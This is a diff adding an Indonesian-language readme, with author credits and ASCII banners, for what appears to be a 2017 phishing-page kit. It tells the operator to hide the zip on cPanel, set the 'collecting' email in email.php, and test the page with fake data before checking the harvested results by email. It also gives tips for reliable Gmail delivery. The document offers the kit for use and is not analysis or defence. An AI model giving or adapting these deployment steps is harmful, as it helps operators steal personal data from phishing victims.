@@ -1,0 +1,42 @@
+<!-- https://ra-biitch.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<!--SCRIPT ORI BY: RIYAN ANDHIKA https://facebook.com/mctb.store -->
+
+---------------------------------------------------------------
+| LANGKAH SETELAH SCRIPT DI EXTRACT FILE PECAH MENJADI BANYAK |
+---------------------------------------------------------------
+1. HAPUS FILE .ZIP YG ANDA UPLOAD DI CPANEL (AGAR SC TIDAK BISA DI DOWNLOAD ORANG .ZIP NYA)
+2. EDIT EMAIL.PHP (UNTUK MENGGANTI EMAIL PENAMPUNG)
+3. TES WEB. NYA ISI DATA ASAL"AN & CEK RESULT DI EMAIL YG DI PASANG DI EMAIL.PHP
+_______________________________________________________________
+   
+  ###   #   #  #####  #####  #
+ #   #  ##  #  #      #      #
+ #####  # # #  #####  ###    #
+ #   #  #  ##  #   #  #      #
+ #   #  #   #  #####  #####  #####
+
+ #   #  #####  #####  #####
+ #   #  #   #  #        #
+ #####  #   #  #####    #
+ #   #  #   #      #    #
+ #   #  #####  #####    #
+________________________________________________________________
+
+● Pastikan Apk Gmail versi baru (Biar kinerja maximal)
+● Pastikan Email sinkron selalu
+● Pastikan koneksi stabil (klo gak stabil mana bisa email sinkron)
+● Cek di utama/spam
+
+■ Bisa jg coba ganti email Yg lain mngkin email lama dh banyak spam di penampung nya.
+⚠ Jika Sendmail Server Error Maka Semua Error, 
+   Kalau Cuma Kamu Mungkin Email Nya Yg Bermasalah /Apk nya
+________________________________________________________________
+                 2017
+    ##############################
+   #   MAKERS BY: RIYAN ANDHIKA   #
+  #     SERVER   : ANGEL HOST      #
+ # WEBSITE  : WWW.ANGELHOSTLIVE.COM #
+######################################
+
+<!--SCRIPT ORI BY: RIYAN ANDHIKA https://facebook.com/mctb.store -->
+<!-- https://ra-biitch.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
